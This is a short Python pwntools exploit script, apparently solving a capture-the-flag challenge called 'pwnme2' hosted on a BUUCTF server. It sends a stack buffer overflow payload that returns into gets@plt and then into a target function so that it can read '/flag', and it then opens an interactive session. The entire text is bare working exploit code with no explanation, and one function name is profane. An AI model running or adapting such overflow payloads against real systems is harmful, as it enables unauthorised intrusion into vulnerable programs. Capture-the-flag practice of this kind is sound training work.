from pwn import * 
r = remote('node3.buuoj.cn',28998)
elf = ELF('pwnme2')
gets_plt = elf.plt['gets']
string = 0x804A060
fuck_func = 0x80485CB
payload = 'a'*0x70+p32(gets_plt)+p32(fuck_func)+p32(string)
r.sendline(payload)
r.sendline('/flag')
r.interactive()